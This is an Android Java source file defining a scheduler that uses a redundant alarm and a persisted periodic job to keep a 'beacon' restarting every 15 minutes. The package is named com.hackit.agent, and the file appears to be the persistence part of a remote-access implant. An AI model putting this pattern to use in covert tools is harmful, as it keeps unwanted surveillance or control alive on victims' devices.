package com.hackit.agent;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/** Redundant wake-ups: one alarm and one job, both restarting the beacon. */
final class Scheduler {
    private static final int ALARM_REQUEST = 0x5F18;
    private static final int JOB_ID = 0x5F19;
    private static final long PERIOD = 15L * 60L * 1000L;

    static void arm(Context ctx) {
        armAlarm(ctx);
        armJob(ctx);
    }

    private static PendingIntent pending(Context ctx) {
        Intent intent = new Intent(ctx, AlarmReceiver.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        return PendingIntent.getBroadcast(ctx, ALARM_REQUEST, intent, flags);
    }

    private static void armAlarm(Context ctx) {
        try {
            AlarmManager alarm = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (alarm == null) {
                return;
            }
            long at = System.currentTimeMillis() + PERIOD;
            PendingIntent intent = pending(ctx);
            if (Build.VERSION.SDK_INT >= 23) {
                alarm.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, intent);
            } else {
                alarm.set(AlarmManager.RTC_WAKEUP, at, intent);
            }
        } catch (Throwable exc) {
            Log.d("alarm: " + exc);
        }
    }

    static void cancel(Context ctx) {
        try {
            AlarmManager alarm = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (alarm != null) {
                alarm.cancel(pending(ctx));
            }
        } catch (Throwable ignored) {
        }
        try {
            JobScheduler jobs = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (jobs != null) {
                jobs.cancel(JOB_ID);
            }
        } catch (Throwable ignored) {
        }
    }

    private static void armJob(Context ctx) {
        if (Build.VERSION.SDK_INT < 21) {
            return;
        }
        try {
            JobScheduler jobs = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (jobs == null) {
                return;
            }
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, new ComponentName(ctx, BeaconJob.class))
                    .setPersisted(true)
                    .setPeriodic(PERIOD)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            if (Build.VERSION.SDK_INT >= 28) {
                builder.setImportantWhileForeground(false);
            }
            jobs.schedule(builder.build());
        } catch (Throwable exc) {
            Log.d("job: " + exc);
        }
    }

    private Scheduler() {
    }
}
